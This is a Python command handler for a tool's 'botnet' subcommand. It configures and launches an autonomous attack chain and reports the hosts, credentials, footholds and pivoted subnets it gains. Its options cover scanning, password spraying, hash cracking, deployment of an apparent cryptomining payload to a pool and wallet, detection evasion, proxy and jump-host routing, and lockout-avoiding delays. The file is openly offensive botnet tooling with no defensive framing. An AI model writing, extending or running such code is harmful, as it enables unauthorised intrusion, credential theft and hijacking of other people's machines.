"""`honeywatch botnet` command handler — runs the autonomous chain."""

from __future__ import annotations

import sys


def _cmd_botnet(args, argv) -> int:
    from honeywatch.chain import ChainConfig, ChainPhase, run_chain

    targets = list(args.targets or [])

    cfg = ChainConfig(
        targets=targets,
        scan_tool=args.scan_tool,
        scan_rate=args.scan_rate,
        max_hosts=args.max_hosts,
        users=[u.strip() for u in args.users.split(",") if u.strip()] if args.users else [],
        user_file=args.user_file,
        passwords=[p.strip() for p in args.passwords.split(",") if p.strip()] if args.passwords else [],
        password_file=args.password_file,
        payload_id=args.payload,
        pool=args.pool or "",
        wallet=args.wallet or "",
        worker=args.worker or "honeywatch",
        threads=args.threads,
        tls=args.tls,
        evasion=[e.strip() for e in args.evasion.split(",") if e.strip()] if args.evasion else [],
        hashcrack_wordlist=args.hashcrack_wordlist or "",
        hashcrack_tool=args.hashcrack_tool,
        business_hours=args.business_hours,
        proxy_file=args.proxy_file,
        jump_file=args.jump_file,
        delay=args.delay,
        jitter=args.jitter,
        lockout_delay=args.lockout_delay,
        host_concurrency=args.host_concurrency,
        min_confidence=args.min_confidence,
        max_rounds=args.max_rounds,
        skip_vpn_check=args.skip_vpn_check,
        db_path=args.db or "honeywatch.db",
        shadow_stash=args.shadow_stash,
        config_path=args.config,
    )

    def on_phase(phase: ChainPhase, msg: str, state, **extra):
        if not args.json:
            print(f"[chain r{state.round}/{phase.value}] {msg}", flush=True)

    state = run_chain(cfg, on_phase=on_phase)

    if args.json:
        import json as _json
        print(_json.dumps({
            "rounds": state.round,
            "hosts": len(state.hosts),
            "sprayable": len(state.sprayable),
            "credentials": len(state.credentials),
            "footholds": len(state.footholds),
            "enqueued": len(state.enqueued),
            "pivoted": len(state.pivoted_subnets),
            "stopped": state.stopped,
            "stop_reason": state.stop_reason,
            "log": state.log,
        }, indent=2, default=str))
        return 0

    print("\nbotnet chain summary")
    print("  rounds:      " + str(state.round))
    print("  hosts:       " + str(len(state.hosts)))
    print("  sprayable:   " + str(len(state.sprayable)))
    print("  credentials: " + str(len(state.credentials)))
    print("  footholds:   " + str(len(state.footholds)))
    print("  enqueued:    " + str(len(state.enqueued)))
    print("  pivoted:     " + str(len(state.pivoted_subnets)))
    print("  status:      " + (state.stop_reason or "running"))
    if state.footholds:
        print("\nfootholds:")
        for ip, port, user, _pw in state.footholds:
            print("  " + ip + ":" + str(port) + "  " + user)
    return 0